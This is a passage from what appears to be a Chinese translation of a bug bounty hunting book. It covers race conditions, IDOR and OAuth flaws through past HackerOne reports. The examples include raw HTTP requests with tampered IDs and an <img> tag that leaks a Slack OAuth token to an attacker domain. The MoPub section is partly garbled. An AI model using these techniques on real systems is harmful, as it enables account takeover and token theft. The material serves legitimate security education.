子域名接管可能仅仅是由网站中指向第三方服务的未申领 DNS 条目引起的。本章的示例包括 Heroku、Fastly、S3、Zendesk、SendGrid 和未注册域名，但其他服务也受到此类漏洞的影响。你可以使用 KnockPy、`crt.sh` 和 `censys.io` 以及附录 A 中的其他工具发现这些漏洞。

管理接管可能需要额外的技巧，例如 Rosen 拥有一个通配符域名，而 Rijal 注册了一个自定义 webhook。当你发现一个潜在漏洞，但基础利用方法无效时，请务必阅读服务文档。此外，无论目标网站是否在使用，都要探索其提供的所有功能。当你发现接管时，务必提供漏洞证明，但要以尊重且不干扰的方式进行。

# 15 竞态条件

![](img/0e0c482eb94dba4b95528b396562dd10_289_0.png)

当两个进程根据一个初始条件竞争完成，而该条件在进程执行期间变得失效时，就会发生竞态条件。一个经典的例子是银行账户之间的资金转账：

1. 你的银行账户有 500 美元，你需要将全部金额转给一个朋友。
2. 使用手机登录银行 App，并请求向你的朋友转账 500 美元。
3. 10 秒后，请求仍在处理中。于是你在笔记本电脑上登录银行网站，看到余额仍为 500 美元，并再次请求转账。
4. 笔记本和手机的请求在几秒钟先后完成。
5. 你的银行账户现在变成了 0。
6. 你的朋友给你发消息说他收到了 1,000 美元。
7. 刷新你的账户，余额仍然为 0。

虽然这是一个不现实的竞态条件例子，因为（希望）所有银行都会防止资金凭空出现，但该过程代表了通用概念。步骤 2 和 3 中转账的条件是：你的账户中有足够的资金来启动转账。但你的账户余额仅在每个转账过程的开始时进行验证。当转账执行时，初始条件不再有效，但两个进程都仍然完成了。

当你拥有快速互联网连接时，HTTP 请求似乎是瞬间完成的，但处理请求仍然需要时间。当你登录网站时，你发送的每个 HTTP 请求都必须经过接收网站的身份验证；此外，网站必须加载你请求的操作所需的数据。竞态条件可能发生在 HTTP 请求完成这两个任务的时间间隔内。以下是在 Web 应用程序中的竞态条件漏洞示例。

## 多次接受 HackerOne 邀请

- **难度：** 低
- **URL:** `hackerone.com/invitations/<INVITE_TOKEN>/`
- **来源：** `https://hackerone.com/reports/119354/`
- **报告日期：** 2016 年 2 月 28 日
- **赏金：** 周边物品 (Swag)

当你进行渗透测试时，注意你的操作取决于某个条件的情况。寻找任何似乎在执行数据库查询、应用应用逻辑并更新数据库的操作。

2016 年 2 月，我正在测试 HackerOne 是否存在未经授权访问程序数据的情况。将黑客和成员添加到我们程序 bug 报告和团队中的邀请功能引起了我的注意。

尽管邀请系统后来发生了变化，但在我测试期间，HackerOne 通过邮件发送唯一链接作为邀请，这些链接与接收者的电子邮件没有关联。任何人都可以接受邀请，但邀请链接本应仅接受一次并由单个账户使用。

作为漏洞猎人，我们无法看到网站接受邀请的实际过程，但我们仍然可以猜测应用原理，并利用假设来发现漏洞。HackerOne 使用了唯一的、类似令牌的链接进行邀请。因此，最可能的情况是，应用程序会在数据库中查找令牌，根据数据库条目添加账户，然后更新数据库中的令牌记录，以便该链接无法再次使用。

这种工作流可能因两个原因导致竞态条件。首先，查询记录然后使用代码逻辑对记录执行操作的过程会产生延迟。查询是启动邀请过程必须满足的前提条件。如果应用程序代码运行缓慢，几乎瞬间完成的请求可能同时执行查询并满足其执行条件。

其次，在数据库中更新记录可能会在条件与修改该条件的操作之间产生延迟。例如，更新记录需要遍历数据库表以找到要更新的记录，这需要时间。

为了测试是否存在竞态条件，除了我的主 HackerOne 账户外，我创建了第二个和第三个账户（我将这些账户称为用户 A、B 和 C）。作为用户 A，我创建了一个程序并邀请用户 B 加入。然后我退出用户 A 身份登录。我以用户 B 的身份收到邀请邮件并在浏览器中登录该账户。我在另一个私密浏览器中以用户 C 登录并打开同一个邀请。

接下来，我将两个浏览器和邀请按钮并排，使它们几乎重叠，如图 15-1 所示。

![](img/0e0c482eb94dba4b95528b396562dd10_292_0.png)

图 15-1：显示邀请的两个浏览器窗口

然后我尽可能快地点击两个按钮。我的第一次尝试没有成功，所以我必须重新执行该过程。但我的第二次尝试成功了。

## 总结

在某些情况下，你可以手动测试竞态条件——尽管你可能需要调整工作流以便同时执行操作。在需要执行复杂步骤的情况下，你可能无法手动测试。相反，请自动化你的测试以便执行操作。

## 突破 KEYBASE 邀请限制

- **难度：** 低
- **URL:** `https://keybase.io/_api/1.0/send_invitations.json/`
- **来源：** `https://hackerone.com/reports/115007/`
- **报告日期：** 2015 年 2 月 5 日
- **赏金：** $350

当网站对允许执行的操作次数有限制时，寻找竞态条件。例如，安全应用 Keybase 通过向注册用户提供三次邀请来限制注册人数。正如上一个例子，黑客可以猜测 Keybase 是如何限制邀请的：最可能的情况是 Keybase 接收邀请请求、检查数据库查看是否有剩余邀请、生成令牌、发送邀请邮件并减少用户剩余的邀请次数。

Josip Franjković 意识到这种行为可能受到竞态条件的影响。Franjković 访问了 `https://keybase.io/account/invitations/`，可以在那里发送邀请、输入电子邮件地址并提交多次邀请。与 HackerOne 的邀请竞态条件不同，手动发送多次邀请非常困难，因此 Franjković 可能使用了 Burp Suite 生成邀请 HTTP 请求。

使用 Burp Suite，你可以将请求发送到 Burp Intruder，它允许你在 HTTP 请求中定义插入点。你可以指定负载以迭代每个 HTTP 请求并将负载添加到插入点。在这种情况下，如果 Franjković 使用的是 Burp，他将指定多个电子邮件地址作为负载并让 Burp 发送每个请求。

结果，Franjković 能够绕过三个用户的限制并向网站邀请了七个用户。Keybase 在解决问题时确认了设计缺陷，并通过使用锁解决了该漏洞。锁是一种编程概念，限制对资源的访问以防止其他进程访问。

在这种情况下，Keybase 接受了邀请竞态条件，但并非所有赏金计划都会为影响较小的漏洞支付奖励，正如之前在“多次接受 HackerOne 邀请”中所所示。

# HACKERONE 支付竞态条件

**难度：低**

**URL:** N/A

**来源：** 未公开

**报告日期：** 2017年4月12日

**赏金金额：** $1,000

某些网站会根据你与它们的交互来更新记录。例如，当你在 HackerOne 上提交报告时，提交操作会触发一封发送到团队指定接收地址的电子邮件，从而触发对团队统计数据的更新。

但某些操作（如支付）并不会立即响应 HTTP 请求而发生。例如，HackerOne 使用后台任务（background job）来为 PayPal 等支付服务创建资金转账请求。后台任务的操作通常是批执行的并由某些触发器启动。网站在需要处理大量数据时通常会使用它们，但它们独立于用户的 HTTP 请求。这意味着，当团队授予赏金时，一旦你的 HTTP 请求被处理，该团队就会收到支付收据，但资金转账会被添加到后台任务中，以便在稍后完成。

后台任务和数据处理是竞态条件中的重要组件，因为它们会在检查条件的操作（检查时间，time of check）与完成操作的操作（使用时间，time of use）之间产生延迟。如果网站仅在向后台任务中添加内容时检查条件，而在实际使用该条件时不检查，那么网站的行为就可能导致竞态条件。

2016年，HackerOne 开始在使用 PayPal 作为支付处理程序时，将授予黑客的赏金合并为单笔支付。此前，如果你在一天内获得多个赏金，你会收到 HackerOne 为每项赏金提供的单独付款。更改后，你将收到所有赏金的总额付款。

2017年4月，Jigar Thakkar 测试了这一功能，并发现他可以重复付款。在支付过程中，HackerOne 会根据电子邮件地址收集赏金，将其合并为一个金额，然后向 PayPal 发送支付请求。在这种情况下，前提条件是查找与赏金相关的电子邮件地址。

Thakkar 发现，如果两个 HackerOne 用户在 PayPal 上注册了相同的电子邮件地址，HackerOne 将赏金合并为针对单个 PayPal 地址的单笔支付。但如果发现漏洞的用户在 HackerOne 后台任务向 PayPal 发送请求之前更改了他们的 PayPal 地址，那么总额付款将同时发送到原始 PayPal 地址和发现漏洞的用户更改的新电子邮件地址。

尽管 Thakkar 成功测试了这个漏洞，但利用后台任务可能是困难的：你必须知道处理是何时启动的，而且你只有几秒钟的时间修改条件。

## 启示

如果你注意到某个网站在你访问很久之后才在执行某些操作，那么它可能正在使用后台任务处理数据。这是一个测试机会。更改定义任务的条件，并检查任务是否使用新条件而非旧条件进行处理。务必像假设后台任务会立即执行那样测试该行为——取决于队列中有多少个任务以及网站处理数据的方法，后台处理通常可以发生得很快。

# SHOPIFY PARTNERS 竞态条件

**难度：** 高

**URL:** N/A

**来源：** `https://hackerone.com/reports/300305/`

**报告日期：** 2017年12月24日

**赏金金额：** $15,250

此前公开的报告可以告诉你去哪里可以发现更多漏洞。Tanner Emek 使用这种策略在 Shopify 的 Partners 平台上发现了一个严重漏洞。该漏洞允许 Emek 只要知道商店当前员工的电子邮件地址，就可以访问任何 Shopify 商店。

Shopify 的 Partner 平台允许商店主授予合作伙伴开发者访问其商店的权限。合作伙伴通过平台请求 Shopify 商店的访问权限，商店主必须在合作伙伴访问商店之前批准请求。但要发送请求，合作伙伴必须有一个经过验证的电子邮件地址。Shopify 通过向提供的电子邮件地址发送唯一的 Shopify URL 来验证电子邮件地址。当合作伙伴访问该 URL 时，该电子邮件地址被视为已验证。每当合作伙伴注册账户或在现有账户上更改电子邮件地址时，就会发生这一过程。

2017年12月，Emek 阅读了由 @uzsunny 撰写的报告，该报告获得了 $20,000 的赏金。报告揭示了一个允许 @uzsunny 访问任何 Shopify 商店的漏洞。当两个合作伙伴账户共享电子邮件并在随后请求同一商店的访问权限时，就会发生该漏洞。Shopify 的代码会将商店现有的员工账户转换为协作账户（collaborator account）。

当合作伙伴在某个商店拥有预先的员工账户并从 Partners 平台请求协作访问权限时，Shopify 的代码会自动接受并将该账户转换为协作账户。在大多数情况下，这种转换是合理的，因为合作伙伴已经通过员工账户访问了商店。

但代码没有正确检查与电子邮件地址关联的是什么种类型的现有账户。处于“待定”（pending）状态且尚未被商店主接受的现有协作账户将会被转换为激活的协作账户。合作伙伴实际上能够在无需商店交互的情况下，自行批准他们自己的协作请求。

Emek 意识到 @uzsunny 报告中的漏洞依赖于能够通过已验证的电子邮件地址发送请求。他意识到，如果他能创建一个账户并将账户的电子邮件地址更改为与员工电子邮件匹配的地址，他可能可以使用与 @uzsunny 相同的方法，恶意地将员工账户转换为由他控制的协作账户。



为了测试是否可能通过竞态条件利用此漏洞，Emek 使用他控制的电子邮件地址创建了一个合作伙伴账户。他收到了来自 Shopify 的一封邮件，但没有立即访问该 URL。相反，在 Partner 平台上，他将自己的电子邮件地址更改为他不拥有的地址，并拦截了电子邮件更改请求。一旦拦截了两个请求，Emek 使用 Burp 连续发送了电子邮件更改请求和验证请求，几乎是同时的。发送请求后，Emek 刷新了页面，发现 Shopify 已执行了更改请求和验证请求。这些操作导致 Shopify 将 Emek 选择的电子邮件验证为他所选的。对任何具有该电子邮件地址现有员工的 Shopify 商店请求协作访问权限，将允许 Emek 无需任何交互即可访问。Shopify 确认该漏洞由于应用程序在更改和验证电子邮件地址时的逻辑竞态条件。Shopify 通过在每次操作期间锁定账户数据库记录并要求商店管理员批准所有协作请求修复了该漏洞。

## 启示

回想第44页关于“HackerOne 意外 HTML 包含”报告，修复一个漏洞并不能修复与应用程序功能相关的所有漏洞。当网站公布新漏洞时，阅读报告并重新测试应用程序。你可能没有发现任何问题，你可能绕过了开发人员预期的修复，或者你可能会发现一个新的漏洞。起码，你将通过测试该功能开发出新技能。彻底测试任何验证系统，思考开发者是如何编写该功能的，以及它是否可能受到竞态条件的影响。

## 总结

每当网站执行取决于某个条件为真的的操作，并且在操作执行后更改了该条件时，就存在竞态条件的机会。关注那些限制你允许执行的操作次数，或使用后台任务处理操作的网站。竞态条件漏洞通常需要条件变化非常快，因此如果你认为某个地方存在漏洞，你可能需要多次尝试才能实际利用该行为。

# 16 不安全的直接对象引用

不安全的直接对象引用（IDOR）漏洞发生在攻击者可以访问或修改对某个对象的引用时，例如文件、数据库记录、账户等，而这些对象本应是不允许他们访问的。例如，假设网站 `www.example.com` 拥有私有的用户资料，这些资料应该只能通过 URL `www.example.com/user?id=1` 由个人资料的所有者访问。`id` 参数决定了你正在查看哪个个人资料。如果你通过将 `id` 参数更改为 2 来访问他人的个人资料，那就是一个 IDOR 漏洞。

# 寻找简单的 IDOR

某些 IDOR 漏洞比其他的更容易发现。你将发现的最简单的 IDOR 漏洞与之前的示例类似：其标识符是一个简单的整数，并随着新记录的创建而自动增加。要测试这种 IDOR，你只需要在 `id` 参数上加 1 或减 1，然后确认你是否可以访问你不应访问的记录。

你可以使用附录 A 中讨论 Web 代理工具 `Burp Suite` 进行此类测试。Web 代理会捕获浏览器发送到网站的流量。`Burp` 允许你监控 HTTP 请求、即时修改它们并重放请求。要测试 IDOR，你可以将请求发送到 `Burp` 的 `Intruder`，在 `id` 参数上设置负载，并选择数值负载来递增或递减。

启动 `Burp Intruder` 攻击后，你可以通过检查 `Burp` 接收到的内容长度和 HTTP 响应码来判断你是否拥有访问权限。例如，如果你测试的网站始终返回状态码为 403 的响应且内容长度完全相同，则该网站可能没有漏洞。状态码 403 意味着访问被拒绝，因此统一的内容长度表示你收到的是标准的“拒绝访问”消息。但如果你收到状态码 200 的响应且内容长度可变，你可能访问了私有记录。

# 寻找更复杂的 IDOR

当 `id` 参数被埋在 POST 请求体中，或者无法通过参数名称轻易识别时，就会发生复杂的 IDOR。你可能会遇到一些不明显的参数，例如被 `ref`、`user` 或 `column` 用作 ID。即使你无法通过其参数名轻松选出 ID，但如果该参数接受整数值，你可能也会识别出它。当你发现一个接受整数值的参数时，对其进行测试，看在修改 ID 时网站的行为如何变化。同样，你可以使用 `Burp` 通过拦截 HTTP 请求、更改 ID 并使用 `Repeater` 工具重放请求，来帮助这一过程变得简单。

当网站使用随机标识符（如通用唯一标识符 UUID）时，IDOR 变得更难识别。UUID 是 36 位字符的字母数字字符串，且不遵循任何模式。如果你发现一个使用 UUID 的网站，通过测试随机值来几乎是不可能找到有效的记录或对象的。相反，你可以通过创建两条记录，并在测试期间切换它们。例如，假设你正尝试访问使用 UUID 标识的用户资料。使用用户 A 创建你的资料；然后以用户 B 的身份登录，尝试使用其 UUID 访问用户 A 的资料。

在某些情况下，你可以使用 UUID 访问对象。但网站可能不会认为这是一个漏洞，因为 UUID 的设计初衷是可以被猜测的。在这些情况下，你需要寻找网站泄露相关随机标识符的机会。假设你处于一个基于团队的网站，用户通过 UUID 标识。当你邀请一个用户加入团队时，对邀请的 HTTP 响应可能会泄露他们的 UUID。在其他情况下，你可能可以在网站上搜索记录，并获得包含 UUID 的返回结果。当你无法发现 UUID 泄露的明显位置时，检查 HTTP 响应中包含的 HTML 页面源代码，其中可能泄露网站上并不直接可见的信息。

你可以通过在 `Burp` 中监控请求，或在浏览器中点击右键并选择“查看页面源代码”来实现此操作。

即使你找不到泄露的 UUID，如果信息是敏感且明确违反了你的权限模型，某些网站会对该漏洞提供奖励。你有责任向公司解释你为什么认为自己发现了一个他们应该处理的问题，以及你判断该漏洞具有什么影响。以下示例展示了寻找 IDOR 漏洞的各种难度范围。

# BINARY.COM 权限提升

**难度：** 低

**URL：** `www.binary.com`

**来源：** `https://hackerone.com/reports/98247/`

**报告日期：** 2015年11月6日

**赏金金额：** $300

当你测试使用账户的 Web 时，应该注册两个不同的账户并同时进行测试。这样做可以让你测试你所控制的两个账户之间的 IDOR，并清楚预期结果是什么。这就是 Mahmoud Gamal 在 `binary.com` 发现 IDOR 时所采用的方法。

`binary.com` 网站是一个交易平台，允许用户交易货币、指数、股票和大商品。在本文报告发布时，URL `www.binary.com/cashier` 会渲染一个带有 `src` 属性的 `iFrame`，该属性引用了子域名 `cashier.binary.com`，并将如 `pin`、`password` 和 `secret` 等 URL 参数传递给网站。由于这些参数可能用于验证用户身份，Gamal 注意到 `pin` 被用作账户标识符，并且它似乎是一个容易猜测的整数。由于网站使用了 `iFrame`，他手动测试了该漏洞。通过两个不同的账户（我们称之为账户 A 和账户 B），他在账户 A 上访问 `/cashier` 路径，记录了 `pin`，然后登录账户 B。当他修改账户 B 使用账户 A 的 `pin` 时，他能够以账户 B 的身份访问账户 A 的信息并请求提现。

`binary.com` 团队在收到报告后一天内解决了该问题。他们声称手动审核并批准提现，因此会注意到异常活动。

## 总结

在这个案例中，黑客通过在登录另一个账户时使用一个账户的客户 `pin` 手动测试了该漏洞。你也可以使用 `Burp` 插件（如 `Authorize` 和 `Authmatrix`）来自动化此类测试。

寻找隐藏的 IDOR 可能更加困难。该网站使用了 `iFrame`，这会导致漏洞 URL 及其参数容易被忽略，因为你在浏览器中直接看不到它们。跟踪可能访问多个 URL 的 `iFrame` 的最佳方法是使用像 `Burp` 这样的代理。`Burp` 会在代理历史中记录对其他 URL（如 `cashier.binary.com`）的任何 GET 请求，让你更容易捕捉请求。

# MONEYBIRD 应用创建

**难度：** 中

**URL：** `https://moneybird.com/user/applications/`

**来源：** `https://hackerone.com/reports/135989/`

**报告日期：** 2016年5月3日

**赏金：** $100

在5月份，我开始测试 Moneybird 的漏洞，重点关注其用户账户权限。为此，我使用账户 A 创建了一个业务，然后邀请了第二个用户账户 B 加入并赋予有限权限。Moneybird 定义了分配给添加用户的权限，例如使用发票、报价单等。

拥有完全权限的用户可以创建应用并启用 API 访问。例如，用户可以提交一个 POST 请求来创建一个完全权限的应用，其格式如下：

```
POST /user/applications HTTP/1.1
Host: moneybird.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
DNT: 1
Referer: https://moneybird.com/user/applications/new
Cookie: _moneybird_session=REDACTED; trusted_computer=
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 397

utf8=%E2%9C%93&authenticity_token=REDACTED&dokeeper_application%5BName%5D=TWApp&token_type=access_token&_administration_id=ABCDEFGHIJKLMNOP&scopes%5B%5D=sales_invoices&scopes%5B%5D=documents&scopes%5B%5D=scop%5B%5D=bank&scopes%5B%5D=settings&dokeeper_application%5Birect_uri%5D=&commit=Save
```

如你所示，POST 体包含了 `administration_id` 参数。这是用户被添加到的账户 ID。虽然该 ID 的长度和随机性使其难以猜测，但当用户访问邀请他们的账户时，该 ID 会立即向被添加的用户披露。例如，当账户 B 登录并访问账户 A 时，会被重定向到 URL `https://moneybird.com/ABCDEFGHIJKLMNOP/`，其中 `ABCDEFGHIJKLMNOP` 就是账户 A 的 `administration_id`。

我测试了账户 B 是否可以在没有相应权限的情况下为账户 A 的业务创建应用程序。我以账户 B 的身份登录并创建了第二个业务，账户 B 是该业务的唯一成员。这将赋予账户 B 对第二个业务的完全权限，尽管账户 B 对账户 A 应该只有有限权限，并且无法为其创建应用。

接下来，我访问了账户 B 的设置页面，创建了一个应用，并使用 `Burp Suite` 拦截了 POST 调用，将 `administration_id` 替换为账户 A 的 ID。发送修改后的请求证实了漏洞有效。作为账户 B，我拥有了一个对账户 A 具有完全权限的应用。这允许账户 B 绕过其账户的权限限制，并使用新创建的应用执行任何他们本不应访问的操作。

## 启示

寻找可能包含 ID 值的参数，例如任何包含 `id` 字符的参数名。特别留意仅包含数字的参数值，因为这些 ID 可能是以某种可猜测的方式生成的。如果你无法猜测 ID，请确定它是否在某处被泄露了。我注意到 `administrator_id` 在名称中包含了 ID 引用。虽然 ID 值没有遵循可猜测的模式，但每当用户被邀请加入公司时，该值就会在 URL 中披露。

## TWITTER MOPUB API TOKEN 窃取

**难度：** 中

**URL：** `https://mopub.com/api/v3/organizations/ID/mopub/activate/`

**来源：** `https://hackerone.com/reports/95552/`

**报告日期：** 2015年10月24日

**赏金：** $5,040

在发现任何漏洞后，务必考虑攻击者滥用它会产生什么影响。2015年10月，Akhil Reni 报告 Twitter 的 Mopup 应用（2013年收购）易受到 IDOR API 密钥和密钥的攻击。但几周后，Reni 意识到该漏洞比他最初报告的要严重，并提交了更新。幸运的是，他在 Twitter 为该漏洞支付赏金之前提交了更新。

当 Reni 最初提交报告时，他发现一个 Mopup 端点没有对用户进行适当授权，并在 POST 响应中泄露账户 API 密钥和 `build_secret`。以下是 POST 请求的内容：

```
POST /api/v3/organizations/5460d2394b793294df01104a/mup/activate
HTTP/1.1
Host: fabric.io
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:41.0) Gecko/20100101
Firefox/41.0
Accept: */*
Accept-Language: en-US,en;q=5
Accept-Encoding: gzip, deflate
X-CSRF-Token: OjGXZOzQGvkkmucYAbALnQlQollsSUBJ1VQjxwq0qip73A=
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-CRASHLYTICS-DEVELOPER-TOKEN:
0b5ea45eb53fa7a1578290be54d7db886e77
X-Requested-With: XMLHttpRequest
Referer: https://fabric.io/img-src-onerrorprompt15/android/apps/.myapplication/mopup
Content-Length: 235
Cookie: <redacted>
Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache
company_name=dragoncompany&address1=123
streetaddress=123&city=hollywood&state=california&zip_code=90210&country_code=US&link=false
```

对该请求的响应如下：

```
{
  "mobub_identity": {
    "id": "549c76e8b11"
  }
}
```

该程序将我的报告标记为“提示性（informative）”并关闭，理由是 `customer_id` 是不可预测的。提示性报告不会产生奖金，并可能对你的 HackerOne 数据产生负面影响。我并没有气馁，开始通过测试我找到的所有端点来寻找 ID 可能会泄露的地方。两天后，我发现了一个漏洞。

我开始使用一个仅具有搜索权限的用户访问 URL，该用户不应该能够访问客户或产品信息。但我发现了一个订单的响应，它生成了以下 JSON：

```json
{
  "select": "(*,hits.data(order.no, customer_info, product_items.(id,item_text), status, creation_date, order_total, currency))",
  "type": "order_search_result",
  "count": 1,
  "start": 0,
  "hits": [{
    "data": {
      "order_no": "00000001",
      "product_items": [
        {
          "_type": "product_item",
          "product_id": "test1231234",
          "item_text": "test"
        }
      ],
      "_type": "order",
      "creation_date": "2017-02-25T02:52:31Z",
      "customer_info": {
        "customer_no": "000006001",
        "_type": "customer_info",
        "customer_name": "pete test",
        "customer_id": "abeZMlojYuUovapiXqHyi0DshH",
        "email": "test@gmail.com"
      }
    }
  ]}
}
```

当攻击者可以访问或修改其本应无法访问的对象引用时，就会发生 IDOR。IDOR 可以非常简单：它们可能只需要通过加减 1 来利用数字递增的整数。

对于使用 UUID 或随机标识符的更复杂的 IDOR，你可能需要对平台进行彻底测试以检查泄露。你可以在多个地方检查泄露，例如 JSON 响应、HTML 内容、通过 Google dorks 以及 URL。在提交报告时，务必详细说明攻击者如何滥用该漏洞。例如，攻击者可以绕过平台权限的漏洞奖金，将低于导致完全账户接管的漏洞奖金。

# 17

## OAuth 漏洞

![](img/0e0c482eb94dba4b95528b396562dd10_316_0.png)



# OAuth

OAuth 是一种开放协议，它简化并标准化了 Web、移动和桌面端应用程序上的安全授权。它允许用户在网站上创建账户，而无需创建用户名或密码。它在网站上常见的“使用 **平台** 登录”按钮，如**图 17-1** 所示，其中平台可以是 Facebook、Google、LinkedIn、Twitter 等。

![](img/0e0c482eb94dba4b95528b396562dd10_316_1.png)

图 17-1：使用 Google 登录 OAuth 按钮示例

OAuth 漏洞是一种应用程序配置漏洞，意味着它们依赖于开发者的实现错误。然而，考虑到 OAuth 漏洞的影响和频率，值得专门用一章来介绍。尽管有许多类型的 OAuth 漏洞，但本章的示例主要包含攻击者能够利用 OAuth 窃取身份验证令牌并在资源服务器上访问目标用户账户信息的情况。

在编写时，OAuth 有两个版本：1.0a 和 2.0，它们彼此不兼容。已经有专门介绍 OAuth 的著作，但本章重点关注 OAuth 2.0 和基础 OAuth 工作流。

## OAuth 工作流

OAuth 过程非常复杂，所以让我们从基础术语开始。最基本的 OAuth 流程中涉及三个参与者：

- 资源所有者（resource owner）是尝试通过 OAuth 登录的用户。
- 资源服务器（resource server）是验证资源所有者的第三方 API。任何网站都可以是资源服务器，但最流行的包括 Facebook、Google、LinkedIn 等。
- 客户端（client）是资源所有者访问的第三方应用程序。客户端允许访问资源服务器上的数据。

当你尝试使用 OAuth 登录时，客户端向资源服务器请求访问你的信息，并请求资源所有者（在此情况下是你）批准访问这些数据。客户端可能会请求访问所有信息，或仅访问特定部分。客户端请求的信息由范围（scopes）定义。范围类似于权限，因为它们限制了应用程序从资源服务器可以访问哪些信息。例如，Facebook 范围包括用户的电子邮件、`public_profile`、`user_friends` 等。如果你只授予客户端访问 `email` 范围，则客户端将无法访问你的个人资料信息、朋友列表和其他信息。

现在你已经了解了涉及的参与者，让我们以 Facebook 作为示例资源服务器，检查首次登录客户端时的 OAuth 过程。OAuth 过程从你访问客户端并点击“使用 Facebook 登录”按钮时开始。这导致向客户端上身份验证端点的 GET 请求。通常，路径看起来如下：`https://example.com/auth`。

客户端响应 302 重定向。重定向 URL 将包含以下定义的参数：

- `client_id`：向资源服务器标识客户端。
- `redirect_uri`：标识资源服务器将浏览器重定向到哪里。
- `response_type`：标识提供的响应类型。这通常是令牌或代码。
- `scope`：标识客户端请求的权限。
- `state`：一个不可预测的值，用于防止跨站请求伪造。

使用 Facebook 启动 OAuth 过程的示例 URL 如下：`https://www.facebook.com/v2.0/dialog/oauth?client_id=123&redirect_uri=https%3A%2F%2FFexample.com%2FFoAuth%2FFCallback&response_type=token&scope=email&state=XYZ`

接收 302 重定向后，浏览器向资源服务器发送 GET 请求。假设你已登录资源服务器，你应该看到批准客户端范围的对话框。图 17-2 显示了 Quora（客户端）代表资源所有者从 Facebook（资源服务器）请求信息的示例。

点击“以 John 的身份继续”按钮将批准 Quora 对列范围的请求，包括资源所有者的公开资料、朋友列表、生日、家乡等。在资源所有者点击按钮后，Facebook 返回 302 HTTP 响应，将浏览器重定向回之前由 `redirect_uri` 参数定义的 URL。重定向还包含令牌和 state 参数。是从 Facebook 重定向到 Quora 的 URL 示例（已针对本书修改）：

```
https://www.quora.com/access_token=EAAAH86O7bQBBAApU2ZBTTuEo0MZA5xBXTQixBuyxrauhNqFtdxViQQ3CwtliGtKqljBZA8&expires_in=5625&state=F32AB83299DADDBAAC82DA
```

在这种情况下，Facebook 返回了一个访问令牌，Quora（客户端）可以使用该令牌立即查询资源所有者的信息。一旦客户端获得了 `access_token`，资源所有者在 OAuth 过程中的参与就结束了。客户端将直接查询 Facebook API 以获取有关资源所有者的所需信息。资源所有者可以在感知客户端与 API 交互的情况下使用客户端。

![](img/0e0c482eb94dba4b95528b396562dd10_321_0.png)

图 17-2：使用 Facebook OAuth 范围授权登录 Quora

然而，如果 Facebook 返回的是代码（code）而不是访问令牌（access token），Quora 需要将该代码交换为访问令牌以便从资源服务器查询信息。这一过程在客户端和资源服务器之间完成，不需要资源所有者的浏览器。为了获取令牌，客户端向资源服务器发送自己的 HTTP 请求，其中包含三个 URL 参数：访问码（access code）、`client_id` 和 `client_secret`。访问码是资源服务器通过 302 HTTP 重定向返回的值。`client_secret` 是一个旨在由客户端保持私密的值。它在配置应用程序并分配 `client_id` 时由资源服务器生成。

最后，一旦资源服务器接收到带有 `client_secret`、`client_id` 和访问码的客户端请求，它将对这些值进行验证，并向客户端返回 `access_token`。在此阶段，客户端可以向资源服务器查询有关资源所有者的信息，OAuth 流程就此完成。一旦你批准资源服务器访问你的信息，下次你使用 Facebook 登录客户端时，OAuth 身份验证过程通常会在后台进行。除非你监控 HTTP 请求，否则你看不到这些交互。客户端可以更改此默认行为，要求资源所有者重新身份验证并批准范围（scopes）；但这种情况非常罕见。

OAuth 漏洞的严重性取决于与被盗令牌关联的许可范围，正如你在接下来的示例所示。

## 窃取 SLACK OAuth 令牌

难度：低

URL：https://slack.com/oauth/authorize/

来源：http://hackerone.com/reports/2575/

报告日期：2013年3月1日

赏金：$100

一种常见的 OAuth 漏洞发生在开发者未妥当配置或比较允许的 `redirect_uri` 参数时，这允许攻击者窃取 OAuth 令牌。2013年3月，Prakhar Prasad 在 Slack 的 OAuth 实现中发现了此类问题。Prasad 通知 Slack，他可以通过在白名单的 `redirect_uri` 后追加任何内容来绕过他们的 `redirect_uri` 限制。换句话说，Slack 仅验证了 `redirect_uri` 参数的开头。如果开发者在 Slack 上注册了一个新应用并将 `https://example.com` 加入白名单，攻击者可以在 URL 后面追加一个值，导致重定向定向到意料之外的地方。例如，修改 URL 传递 `redirect_uri=https://<attacker>.com` 会被拒绝，但传递 `redirect_uri=https://www.<example>.comx` 则会被接受。

为了利用这种行为，攻击者只需在他们的恶意站点上创建一个匹配的子域名。如果目标用户访问了经过恶意修改的 URL，Slack 会将 OAuth 令牌发送到攻击者的站点。攻击者可以通过在恶意网页上嵌入 `<img>` 标签来代表目标用户调用请求，例如 `<img src=https://slack.com/oauth/authorize?response_type=token&client_id=APP_ID&redirect_uri=https://www.example.com.attacker.com>`。使用 `<img>` 标签在渲染时会自动触发 HTTP GET 请求。

### 启示

未对严格检查 `redirect_uri` 的漏洞是常见的 OAuth 配置错误。有时，漏洞是由于应用程序将某个域名（例如 `<example>.com`）注册为可接受的 `redirect_uri` 导致的。其他情况下，是因为资源服务器对 `redirect_uri` 参数的开头和结尾执行了严格检查。在这个例子中，是后者。当你寻找 OAuth 漏洞时，请务必测试任何指示正在使用重的参数。

## 使用默认密码通过身份验证

难度：低

URL：https://flurry.com/auth/v1/account/

来源：https://lightningsecurity.io/blog/password-not-provided/

报告日期：2017年6月30日

赏金：未公开

在任何 OAuth 实现中寻找漏洞都涉及从头到尾审查整个身份验证过程。这包括识别不属于标准流程的 HTTP 请求。这些请求通常表明开发者自定义了流程，并可能引入了漏洞。Jack Cable 在 2017 年 6 月在查看 Yahoo 的漏洞赏金计划时，注意到了这种情况。

Yahoo 的赏金计划包含了数据分析网站 Flurry.com。为了开始测试，Cable 通过 Yahoo 的 OAuth 实现使用他的 @yahoo.com 邮箱地址注册了 Flurry 账户。在 Flurry 和 Yahoo! 交换 OAuth 令牌后，向 Flurry 的最终 POST 请求如下：

```
POST /auth/v1/account HTTP/1.1
Host: flurry.com
Connection: close
Content-Length: 205
Content-Type: application/vnd.api+json
Referer: https://login.flurry.com/signup
Accept-Language: en-US,en;q=0.8,q=0.6
{"type":"account","id":"","attributes":{"email":"@yahoo.com","companyName":"1234","firstName":"jack","lastName":"cable","password":"not-provided"}}
```

